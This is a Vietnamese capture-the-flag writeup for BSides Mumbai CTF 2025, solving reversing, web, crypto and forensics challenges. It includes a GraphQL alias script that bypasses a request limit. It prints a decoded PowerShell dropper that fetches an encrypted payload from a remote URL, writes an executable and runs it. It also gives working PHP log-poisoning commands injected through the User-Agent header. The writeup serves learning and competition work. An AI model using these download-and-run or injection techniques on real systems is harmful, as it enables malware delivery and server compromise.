---
layout: post
title:  "Writeup Bsides Mumbai CTF 2025"
tags: [writeup, misc]
authors: 
image: assets/challenge%20files/BsidesMumbaiCTF/Bsides_Logo.png
math: true
---

## 🛠️Rev/idkwhattonamethis

### 1. Challenge Information

```
Point : 50
Author : 5h1kh4r
Solve by : Quang Đô
```

### 2. Solution

Bài này không có description nên bật ida thôi hẹ hẹ(nếu grep ko thấy flag thì ida nhé).
Một điều chắc chắn b phải làm đó là tìm hàm main :> tiếp đó phân tích hàm main (nhớ ko nhầm thì bên ghidra là entry point hay sao ý).

![pic](/assets/challenge%20files/BsidesMumbaiCTF/Rev/idkwhattonamethis/picture1.png)

như ta thấy chương trình :
```c
{
  unsigned int v3; // eax
  __int64 v4; // rdi

  v3 = time(0);
  v4 = v3;
  srand(v3);
  return bamboozler(v4, argv);
}
```
tiếp đó ta xét hàm bamboozler() :
```c
__int64 bamboozler()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  wibbleWobble();
  zoinkifyLogic();
  if ( (unsigned __int8)flibberVMCheck() )
    return 0xFFFFFFFFLL;
  printf("Provide access glyph: ");
  __isoc99_scanf("%31s", s);
  if ( strlen(s) == 5 )
  {
    scrumbleFlaginator(s);
    return 0;
  }
  else
  {
    puts("No glyph, no glory.");
    return 1;
  }
}
```
Bỏ qua các hàm wibbleWobble(), zoinkifyLogic(), flibberVMCheck() vì chúng chỉ dùng để kiểm tra môi trường.
Chương trình trên sẽ thực hiện nhập vào s với độ dài là 5 sau đó thực thi hàm scrumbleFlaginator(). Ok tiếp theo ta sẽ cùng phân tích hàm scrumbleFlaginator() nhé!
```c
int __fastcall scrumbleFlaginator(const char *a1)
{
  unsigned __int64 v1; // rbx
  size_t v2; // rsi
  unsigned __int64 v3; // r12
  size_t v4; // rax
  char v5; // al
  char nptr[3]; // [rsp+1Dh] [rbp-93h] BYREF
  char v8[48]; // [rsp+20h] [rbp-90h] BYREF
  _QWORD v9[8]; // [rsp+50h] [rbp-60h] BYREF
  int v10; // [rsp+90h] [rbp-20h]
  char v11; // [rsp+97h] [rbp-19h]
  int v12; // [rsp+98h] [rbp-18h]
  int v13; // [rsp+9Ch] [rbp-14h]

  memset(v9, 0, sizeof(v9));
  strcpy(v8, "QWERTYUIOPASDFGHJKLZXCVBNM9876543210");
  v13 = 0;
  v12 = 0;
  while ( (unsigned __int64)v13 <= 0x31 )
  {
    nptr[0] = aDed9c1150affde[v13];
    nptr[1] = aDed9c1150affde[v13 + 1];
    nptr[2] = 0;
    v11 = strtol(nptr, 0, 16);
    v1 = v12;
    v2 = strlen(a1);
    LODWORD(v1) = squibbleIndex((unsigned int)a1[v1 % v2]);
    v3 = v12;
    v4 = strlen(a1);
    v5 = gizmoXOR((unsigned int)v8[v12 % 0x25uLL], (unsigned int)a1[v3 % v4]);
    v10 = v1 ^ v5;
    *((_BYTE *)v9 + v13 / 2) = v11 ^ v1 ^ v5;
    ++v12;
    v13 += 2;
  }
  return printf("Final Output: %s\n", (const char *)v9);
}
```
Như ta thấy đây là 1 loại encrypt vì vậy ta hiểu rằng chương trình sẽ chạy với đầu vào là 5 kí tự và đầu ra là 1 chuỗi đã được encrypt từ input
=> ta cần bruteforce kí tự đầu vào đến khi ra được chuỗi kí tự mà có chứa chuỗi flag mà ta mong muốn.

Tôi sẽ sử dụng c++ vì tôi nghĩ nó nhanh hơn python và kết hợp với multi threading để tăng tốc brute :
```c
#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <mutex>
#include <atomic>

const std::string aDed = "ded9c1150affdeb62317c8a9e72226a5e6df3372dac1e14e0b";
const std::string v8 = "QWERTYUIOPASDFGHJKLZXCVBNM9876543210";
const std::string charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

std::mutex output_mutex;

int squibbleIndex(char c) {
    return (3 * static_cast<int>(c) + 7) % 13;
}

int gizmoXOR(char a, char b) {
    return (a ^ b) ^ (2 * (a & b));
}

std::string scrumbleFlaginator(const std::string& input) {
    std::string out;
    int v12 = 0;
    for (size_t i = 0; i < aDed.size(); i += 2) {
        std::string hex = aDed.substr(i, 2);
        int v11 = std::stoi(hex, nullptr, 16);

        char c = input[v12 % input.length()];
        int v1 = squibbleIndex(c);
        int v5 = gizmoXOR(v8[v12 % v8.size()], c);
        char result = static_cast<char>(v11 ^ v1 ^ v5);

        out.push_back(result);
        v12++;
    }
    return out;
}

bool isPrintable(const std::string& s) {
    for (char c : s) {
        if (c < 32 || c > 126) return false;
    }
    return true;
}

void worker(char c1) {
    for (char c2 : charset) {
        for (char c3 : charset) {
            for (char c4 : charset) {
                for (char c5 : charset) {
                    std::string guess = {c1, c2, c3, c4, c5};
                    std::string result = scrumbleFlaginator(guess);

                    if (result.rfind("BMCTF{", 0) == 0 && isPrintable(result)) {
                        std::lock_guard<std::mutex> lock(output_mutex);
                        std::cout << "[+] Input  = " << guess << "\n";
                        std::cout << "[+] Output = " << result << "\n\n";
                    }
                }
            }
        }
    }
}

int main() {
    std::vector<std::thread> threads;
    std::cout << "[*] Brute-force all matches that start with BMCTF{ ... }\n";

    for (char c : charset) {
        threads.emplace_back(worker, c);
    }

    for (auto& t : threads) {
        t.join();
    }

    std::cout << "[*] Done.\n";
    return 0;
}
```
Tiếp đó build và brute thôi nhé.

FLAG : *BMCTF{H0W_D1d_Y0u_D0_It?}*

## 🌐Web/Operation Overflow

### 1. Challenge Information

```
Point : Null
Author : Null
Description: Guess the secret number and I’ll give you the flag. Sounds easy, doesn’t it? But this isn’t your average guessing game — let’s see how clever you really are.
Solve by : Đức Hùng
```

### 2. Solution
Thấy một trang web mà mình phải đoán số từ 1 đến 100,000 và nếu đoán đúng số thì sẽ được flag. 

![pic](/assets/challenge%20files/BsidesMumbaiCTF/Web/Operation/Pic1.png)

Nhưng có limit là chỉ 10 lượt đoán, sau đó sẽ không được submit nữa, như vậy limit là 10 request.

![pic](/assets/challenge%20files/BsidesMumbaiCTF/Web/Operation/Pic2.png)

Như vậy cần bypass limit bằng Graphql Alias
GraphQL cho phép chúng ta thực hiện nhiều query trong một request duy nhất bằng cách sử dụng các alias. Thay vì gửi rất nhiều request cho nhiều số thì mình có thể gộp chúng lại. 
Chúng ta có thể check tới 10,000 số mà chỉ trong 1 request. 

Sử dụng code python sau để check 10,000 số cùng lúc nhưng chỉ trong 1 request duy nhất, từ đó chỉ cần 10 request để check hết 100,000 số mà không sợ bị vượt quá limit đã cho.
{% raw %}
```python
import requests

URL = "http://localhost:4000/graphql"

HEADERS = {
    "Content-Type": "application/json",
    "Origin": "http://localhost.com:4000",
    "Referer": "http://localhost.com:4000/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
}

COOKIES = {
    "connect.sid": "s%3Au9bfSbUSXIohLXqTZYLb9De1zgLifUie.WLVuSARgw0f6o%2F8ZsPoINXwnFFeh%2Bd9Q6k8IGk9UOTo"
}

def build_query(start, end):
    query_parts = []
    for i in range(start, end):
        query_parts.append(
            f'alias{i}: guessNumber(number: {i}) {{ correct message flag }}'
        )
    return "query { " + "\n".join(query_parts) + " }"

def main():
    step = 10000
    for batch in range(10):
        start = batch * step + 1
        end = start + step
        print(f"[*] Sending numbers from {start} to {end - 1}...")
        query = build_query(start, end)
        payload = {"query": query}
        response = requests.post(URL, json=payload, headers=HEADERS, cookies=COOKIES)
        if response.status_code != 200:
            print(f"[!] Request failed with status code {response.status_code}")
            print(response.text)
            break
        data = response.json().get("data", {})
        for alias, result in data.items():
            if result["correct"]:
                print(f"[+] Found the correct number: {alias[5:]}")
                print(f"Message: {result['message']}")
                print(f"Flag: {result['flag']}")
                return
    print("[-] Finished. No correct number found in range.")

if __name__ == "__main__":
    main()
```
{% endraw %}
Sau khi chạy code xong sẽ ra flag. 

![pic](/assets/challenge%20files/BsidesMumbaiCTF/Web/Operation/Pic3.png)

FLAG: *BMCTF{4l14s_br34k_l1m1ts}*

## 🔐Crypto/Trixie Prixie

### 1. Challenge Information

```
Point : Null
Author : Null
Solve by : Quang An
```

### 2. Solution
Đề bài cho ta 3 file : 
```
File Trixie_Prixie.py – mã nguồn Python.
File key.npy – chứa một ma trận số nguyên 4x4.
File cipher.txt – chứa chuỗi base64, có vẻ là kết quả mã hóa.
```
Tải file key.npy tôi thấy được: 
![pic](/assets/challenge%20files/BsidesMumbaiCTF/Crypto/Trixie%20Prixie/picture1.png)

Mở file: Trixie_Prixie.py
```python
key = generate_valid_matrix()
fake_key = np.rot90(key)
cipher = encrypt_message(flag, key)
np.save("key.npy", fake_key)
```
Đây là fake key, cần xoay ngược lại để lấy key thật.

Vậy ta phải phục hồi lại key gốc bằng cách xoay ngược rot90.
```python
def encrypt_message(message, key, block_size=4):
    message_bytes = [ord(c) for c in message]
    while len(message_bytes) % block_size != 0:
        message_bytes.append(0)
    encrypted = []
    for i in range(0, len(message_bytes), block_size):	
        block = np.array(message_bytes[i:i+block_size])
        enc_block = key @ block % 256
        encrypted.extend(enc_block)
    return bytes(encrypted)
```

Mỗi block 4 byte → nhân với key dạng ma trận 4x4 → 
𝑚
𝑜
𝑑
𝑢
𝑙
𝑜
256
(
𝐶
=
𝐾
×
𝑃
𝑚
𝑜
𝑑
256
)

Đảo ngược quá trình: `P = K⁻¹ × C mod 256`

Từ key.npy (fake key) → xoay ngược 90° để lấy lại key thật: `real_key = np.rot90(fake_key, k=-1).`

Tính nghịch đảo modular của key: `K_inv = Matrix(real_key.tolist()).inv_mod(256)`

Giải mã block: `P_block = (K_inv @ C_block) % 256`

Mở: cipher.txt
```
oo531K3aO9Ayq19H7G2wOGyzpun2A8VW
```
Đây là chuỗi base64 giải mã base64 để lấy raw bytes. 
Chia thành các block 4 bytes → decrypt như trên :>
```python
import numpy as np
import base64
import sympy
fake_key = np.load("key.npy")
real_key = np.rot90(fake_key, k=-1)
key_inv = sympy.Matrix(real_key.tolist()).inv_mod(256)
key_inv_np = np.array(key_inv).astype(np.int64)

with open("cipher.txt", "r") as f:
    cipher_b64 = f.read().strip()

cipher_bytes = base64.b64decode(cipher_b64)
cipher_blocks = np.frombuffer(cipher_bytes, dtype=np.uint8).reshape(-1, 4).T
decrypted = (key_inv_np @ cipher_blocks) % 256
flat = decrypted.T.flatten()
plaintext = ''.join(chr(b) for b in flat if b != 0)

print("Flag:", plaintext) 
```
Sau khi chạy code ra được flag.

FLAG : *BMCTF{Matrixie_crypt10n}*

## 🔐Crypto/Too small i guess

### 1. Challenge Information

```
Point : Null
Author : Null
Solve by : Quang An
```

### 2. Solution
```
N = `57003853477618592533708139357440215706141092564456154826439718767682290353899`
c = `16088604257693894556768626620517616259596646357071343869173417352209986726562`
e = `65537`
```

Theo tôi: 

Đây là bài toán giải mã RSA: Cho `N`, `e`, và bản mã `c` để làm được bài này thì cần có tý công thức, lí thuyết của RSA cơ bản. Nghĩa là giải mã bản mã `c` để tìm `m`.

RSA có dạng:  

$$c = m^e \mod N$$

Muốn giải được `m`, cần khóa riêng `d`, rồi dùng: 

$$m = c^d \mod N$$

Chỉ cần `N`, `e`, `c` ⇒ rõ ràng là mã hóa bằng RSA 1 lớp. Không có padding hay lồng thêm thuật toán phụ, nên áp dụng công thức trực tiếp.
Phân tích N thành $p × q$ của bài này có nhiều chữ số nên chạy hơi lâu nên tôi dùng `Factordb`:
```
p = 228337825920501024345892620188308555741`
q = 249647001095058483196231850349361480039`
```

Tính totient φ(N) :  $$ φ(N)=(p-1)(q-1) $$

Cái này quan trọng để tính nghịch đảo khóa riêng : 

$$φ = (p - 1) * (q - 1)$$

Tính khóa riêng ( chỗ  này tôi không rõ nên tra chat) 
Khóa riêng `d` là: 

$$d \equiv e^{-1} \mod \varphi(N)$$

Tức là: tìm một số `d` sao cho: 

$$e \times d \equiv 1 \mod \varphi(N)$$

```python
from Crypto.Util.number import inverse
d = inverse(e, phi)
```

Cuối cùng giải mã nó: `m = pow(c, d, N)`  chuyển về thành dạng byte 
```python
from Crypto.Util.number import long_to_bytes
plaintext = long_to_bytes(m)
```

Code:
```python
from Crypto.Util.number import inverse, long_to_bytes
N = 57003853477618592533708139357440215706141092564456154826439718767682290353899
e = 65537
c = 16088604257693894556768626620517616259596646357071343869173417352209986726562

p = 228337825920501024345892620188308555741
q = 249647001095058483196231850349361480039


phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, N)
plaintext = long_to_bytes(m)
print("Flag:", plaintext.decode(errors="ignore"))
```

Cuối cùng tìm được flag.

FLAG: *BMCTF{S1z3_Matt3r5}*


## 🕵️‍♂️Forensics/Disk Message

### 1. Challenge Information

```
Point : Null
Author : Null
Solve by : Tuấn Anh
```

### 2. Solution
Tải attachments cho Disk Message tại [đây](https://github.com/log1cs/writeups/tree/bside-ctf-2025/attachments/DiskMessage).

Decode string Base64 trong file `disk.enc` ra bằng CyberChef, apply 2 options sau:
- From Base64
- Remove null bytes

Chúng ta sẽ nhận được output như dưới:

```
$e=(new-object Net.WebClient).DownloadString([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRsYWIuY29tLy0vc25pcHBldHMvNDg2NzQyOC9yYXcvbWFpbi91cGRhdGUuZW5j')));$ed=[System.Convert]::FromBase64String($e);$maes=new-object "System.Security.Cryptography.AesManaged";$maes.IV=$ed[0..15];$maes.Mode=[System.Security.Cryptography.CipherMode]::CBC;$maes.KeySize=256;$maes.BlockSize=128;$maes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;$maes.Key=[System.Security.Cryptography.HashAlgorithm]::Create('sha256').ComputeHash([System.Text.Encoding]::UTF8.GetBytes((& cmd /c vol).Split()[-1].Trim()));$dc=$maes.CreateDecryptor();$dm=$dc.TransformFinalBlock($ed, 16, $ed.Length - 16);Set-Content -Path "message.exe" -Value $dm -AsByteStream -NoNewline;.\message.exe
```
Ở đây chúng ta lại có thêm 1 string Base64 khác (`aHR0cHM6Ly9naXRsYWIuY29tLy0vc25pcHBldHMvNDg2NzQyOC9yYXcvbWFpbi91cGRhdGUuZW5j`), tiếp tục decode tiếp và chúng ta sẽ có được output là 1 đường link dẫn tới [1 file khác](https://gitlab.com/-/snippets/4867428/raw/main/update.enc).
Và file này lại được encode bằng Base64, chúng ta lại decode tiếp lần nữa:
![pic](/assets/challenge%20files/BsidesMumbaiCTF/Forensics/Disk%20Message/DiskMessage.png)

Chú ý đến header trong hình ảnh trên, đây là header của 1 file EXE. Đương nhiên thì tại vừa rồi chúng ta đã remove null bytes, nên một số thành phần của file EXE cũng đã bị lược bỏ đi khiến cho nó không thể chạy được.

Giờ thì tắt `Remove Null Bytes` đi để giữ được hết các raw contents trong file EXE. Better leave it untouched.

Lưu file trên CyberChef với đuôi EXE, chạy lên và chúng ta sẽ thấy được flag.
![pic](/assets/challenge%20files/BsidesMumbaiCTF/Forensics/Disk%20Message/DiskMessage2.png)

FLAG : *BMCTF{n0t_3very0n3s_cup_of_t34}*

## 🕵️‍♂️Forensics/Logarithms

### 1. Challenge Information

```
Point : Null
Author : Null
Description: I was studying about logarithms and suddenly thought of making this challenge. Don’t know how both are related though
Solve by : Anh Quân
```

### 2. Solution
File được cung cấp: `access.log`. Trong file đó có thể thấy `index.php`, thử đến đó :

Nhận thấy rằng page được truyền trực tiếp đến `include()`, nên mình có thể inject PHP vào access.log sau đó thực thi nó
Dùng header `User-Agent` để inject vào log PHP, mỗi request sẽ thêm vào 1 entry mới. 

Viết khóa AES, tới /tmp/key :
```
curl -s \
  -H "User-Agent: <?php file_put_contents('/tmp/key', str_rot13('diNbkitqV5riXS69fTlyAj==')); ?>" \
  "http://challenge/index.php?page=logs/access.log"
```

Viết 6 đoạn ciphertext đến `/tmp/s0 … /tmp/s5` : 
```
SEGMENTS=(
  dhhfp88dfgL=
  Ys4tW4mWgOf=
  bi3wo2dGq8H=
  b5evSgbsaWx=
  +Sfbx/gllSD=
  dBYtUX9UAlV=
)
for i in "${!SEGMENTS[@]}"; do
  curl -s \
    -H "User-Agent: <?php file_put_contents('/tmp/s$i', '${SEGMENTS[i]}'); ?>" \
    "http://challenge/index.php?page=logs/access.log"
done
```

Thêm log vào 1 lần nữa để thực thi tất cả các injection
`http://challenge/index.php?page=logs/access.log`. 

Bây giờ, ở server ta đã có:

```
/tmp/key : chứa rot13 của key base64 thật
/tmp/s0 … /tmp/s5`: mỗi cái chứa chunk rot13 của base64 của ciphertext
```

Tiếp theo là extract và decode bằng code python sau : 
```python
import base64, codecs
from Crypto.Cipher import AES

# 1. Load and rot13‐decode the key
with open('/tmp/key') as f:
    key_b64 = codecs.decode(f.read().strip(), 'rot_13')
key = base64.b64decode(key_b64)

# 2. Read, rot13‐decode, Base64‐decode, and concatenate ciphertext segments
cipher = b''
for i in range(6):
    seg_rot13 = open(f'/tmp/s{i}').read().strip()
    seg_b64   = codecs.decode(seg_rot13, 'rot_13')
    cipher   += base64.b64decode(seg_b64)

# 3. Decrypt with AES-128-ECB and strip PKCS#7 padding
dec = AES.new(key, AES.MODE_ECB).decrypt(cipher)
pad = dec[-1]
flag = dec[:-pad].decode()
print(flag)
```

FLAG : *BMCTF{1_Kn0w_Ab0uT_A35_4ND_L0g5!!}*

## 🕵️‍♂️ Forensics/Author Ki PFP

### 1. Challenge Information

```
Point : Null
Author : Null
Description: I was studying about logarithms and suddenly thought of making this challenge. Don’t know how both are related though
Solve by : Xuân Duy
```

### 2. Solution
Đề bài cho một bức hình : 

![pic](/assets/challenge%20files/BsidesMumbaiCTF/Forensics/AuthorKiPFP/picture1.png)

Ban đầu chưa có manh mối gì nên mình qua chạy thử các tools như `binwalk` và `zsteg` những không cho kết quả gì khả quan.
Sau vài tiếng mất phương hướng cho bài này thì mình mở ảnh lên và chú ý đến cái độ phân giải của bức ảnh khi chỉ thấy `1080x1079`. 
Nghi ngờ ảnh đã bị cắt bớt nên mình hở HxD lên và thay thế các byte quyết định độ dài bằng `04 C7` 
![pic](/assets/challenge%20files/BsidesMumbaiCTF/Forensics/AuthorKiPFP/picture2.png)

Mở ảnh lên và ta thấy được flag : 
![pic](/assets/challenge%20files/BsidesMumbaiCTF/Forensics/AuthorKiPFP/AKP3.png)

FLAG : *BMCTF{H3X_IM4G3_R3S1Z1NG!}*